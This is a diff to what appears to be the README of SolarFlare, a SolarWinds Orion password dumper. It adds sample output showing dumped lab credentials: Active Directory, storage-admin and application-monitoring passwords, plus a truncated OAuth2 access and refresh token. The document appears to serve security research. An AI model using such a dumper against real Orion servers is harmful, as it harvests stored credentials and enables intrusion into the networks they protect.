@@ -180,6 +180,66 @@ Blog post: https://malicious.link/post/2020/solarflare-release-password-dumper-f
 |               Password: ASDqwe123
 |               Username: root
 ------------------11--------------------------
+------------------12--------------------------
+| Type: SolarWinds.Orion.Core.SharedCredentials.Credentials.ActiveDirectoryCredential
+| Name: SITTINGDUCK\uberuser
+| 	Desc: 
+| 	Owner: Orion
+| 		Password: ASDqwe213
+| 		Username: SITTINGDUCK\uberuser
+------------------12--------------------------
+------------------13--------------------------
+| Type: SolarWinds.APM.Common.Credentials.ApmUsernamePasswordCredential
+| Name: App Monitoring User
+| 	Desc: 
+| 	Owner: APM
+| 		Password: ASDqwe123
+| 		Username: SITTINGDUCK\uberuser
+------------------13--------------------------
+------------------14--------------------------
+| Type: SolarWinds.SRM.Common.Credentials.SmisCredentials
+| Name: EMC_SMIS_Solarwinds
+| 	Desc: 
+| 	Owner: SRM
+| 		HttpPort: 5988
+| 		HttpsPort: 5989
+| 		InteropNamespace: /interop
+| 		Namespace: root/emc
+| 		Password: ASDqwe123
+| 		Username: solarwinds
+| 		UseSSL: true
+------------------14--------------------------
+------------------15--------------------------
+| Type: SolarWinds.ESI.Common.Connection.ExternalSystemCredential
+| Name: ESC
+| 	Desc: 
+| 	Owner: ESI
+| 		Password: ASDqwe123
+| 		Username: solar_winds
+------------------15--------------------------
+------------------16--------------------------
+| Type: SolarWinds.Orion.Web.Integration.OAuth2Token
+| Name: SITTINGDUCK\uberuser
+| 	Desc: 
+| 	Owner: Web.Integration
+| 		AccessToken: GthQHd3<snip>
+| 		AccessTokenExpiration: 2020-11-01T10:52:50.2768075Z
+| 		AccessTokenIssueDate: 2020-11-01T09:52:51.2768075Z
+| 		RefreshToken:hEyph9WqIfzm<snip>
+| 		Scopes: 
+| 		Username: uberuser@sittingduck.info
+------------------16--------------------------
+------------------17--------------------------
+| Type: SolarWinds.SRM.Common.Credentials.XtremIoHttpCredential
+| Name: XtremIO_Admin
+| 	Desc: 
+| 	Owner: SRM
+| 		HttpPort: 80
+| 		HttpsPort: 443
+| 		Password: ASDqwe123
+| 		Username: admin
+| 		UseSsl: true
+------------------18--------------------------
 ============================================
 ============================================
 ```
